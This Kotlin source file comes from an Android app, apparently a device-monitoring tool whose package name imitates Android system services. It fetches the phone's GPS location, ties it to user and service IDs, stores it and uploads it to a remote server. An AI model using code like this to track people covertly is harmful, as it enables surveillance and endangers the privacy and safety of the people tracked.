package com.android.services.logs.collectors

import android.annotation.SuppressLint
import android.content.Context
import android.location.Location
import com.android.services.db.entities.GpsLocation
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.CrashlyticsUtil
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.google.android.gms.location.LocationServices
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class GpsLocationCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    @SuppressLint("MissingPermission")
    @Throws(Exception::class)
    override fun uploadLogs() {
        if (AppConstants.syncGeoLocation) {
            logVerbose("${AppConstants.GPS_LOCATION_TYPE} Retrieving device Gps Location")
            if (AppUtils.checkLocationProviderEnabled(context) && AppUtils.areLocationPermissionsGranted(
                    context) && AppUtils.shouldFetchDeviceLocation()
            ) {
                val mFusedLocationClient = LocationServices.getFusedLocationProviderClient(context)
                mFusedLocationClient.lastLocation
                    .addOnSuccessListener { location: Location? ->
                        val executor: ExecutorService = Executors.newSingleThreadExecutor()
                        executor.execute {
                            if (location == null) {
                                try {
                                    postGeoLocations()
                                } catch (e: Exception) {
                                    logException(e.message!!, AppConstants.GPS_LOCATION_TYPE, e)
                                }
                            } else {
                                try {
                                    addLocation(location)
                                    postGeoLocations()
                                } catch (e: Exception) {
                                    logException(e.message!!, AppConstants.GPS_LOCATION_TYPE, e)
                                }
                            }
                        }
                    }.addOnFailureListener { e: Exception ->
                        logException(e.message!!, AppConstants.GPS_LOCATION_TYPE, e)
                        CrashlyticsUtil.addCrashlyticsException(e)
                    }
            } else
                logVerbose("${AppConstants.GPS_LOCATION_TYPE} Retrieving device Gps Location")
        } else {
            logVerbose("${AppConstants.GPS_LOCATION_TYPE} Sync is Off")
        }
    }

    private fun addLocation(location: Location) {
        val currentSystemTime = System.currentTimeMillis().toString()
        val latitude = location.latitude.toString()
        val longitude = location.longitude.toString()
        logVerbose("${AppConstants.GPS_LOCATION_TYPE} latitude = $latitude")
        logVerbose("${AppConstants.GPS_LOCATION_TYPE} longitude = $longitude")
        val gpsLocation = GpsLocation()
        gpsLocation.geoLocationName =
            AppUtils.formatDateTime(currentSystemTime, AppConstants.DATE_FORMAT_2)
        gpsLocation.geoLocationLattitude = latitude
        gpsLocation.geoLocationLongitude = longitude
        gpsLocation.cellTowerId = "gps"
        gpsLocation.geoLocationTime = AppUtils.formatDate(currentSystemTime)
        gpsLocation.geoLocationStatus = "1"
        gpsLocation.userId = AppConstants.userId ?: ""
        gpsLocation.phoneServiceId = AppConstants.phoneServiceId ?: ""
        gpsLocation.date = AppUtils.getDate(currentSystemTime.toLong())
        gpsLocation.locationStatus = 0
        localDatabaseSource.insertGpsLocation(gpsLocation)
        AppConstants.locationLatitude = latitude
        AppConstants.locationLongitude = longitude
    }

    private fun postGeoLocations() {
        localDatabaseSource.getGpsLocations { geoLocations ->
            if (geoLocations.isNotEmpty()) {
                val startDate = geoLocations[geoLocations.size - 1].date
                val endDate = geoLocations[0].date
                val serverHelper = RemoteServerHelper(
                    context,
                    AppConstants.GPS_LOCATION_TYPE,
                    localDatabaseSource,
                    tosApi = tosApi,
                    startDate = startDate,
                    endDate = endDate
                )
                serverHelper.upload(geoLocations)
            }
        }
    }
}